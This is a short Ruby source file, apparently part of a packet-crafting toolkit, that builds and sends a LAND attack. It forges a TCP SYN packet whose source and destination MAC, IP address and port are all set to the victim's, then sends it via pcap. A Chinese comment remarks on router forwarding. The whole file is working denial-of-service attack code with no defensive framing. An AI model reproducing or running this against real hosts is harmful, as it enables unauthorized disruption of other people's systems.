require_relative '../../protocol/tcp_pac.rb'

class TCPP
	def self.land(pcap)
		land_pac = TCPP.syn_pac{|pac|
			pac.etherh.src_mac = $victim_mac #若为$victim_mac，路由器不给过
			pac.etherh.dst_mac = $victim_mac
			pac.ipv4h.set_addr_by_arr($victim_ip, :src)
			pac.ipv4h.set_addr_by_arr($victim_ip, :dst)
			pac.tcph.src_port = $victim_port
			pac.tcph.dst_port = $victim_port
		}
		pcap.send_packet(land_pac)
	end
end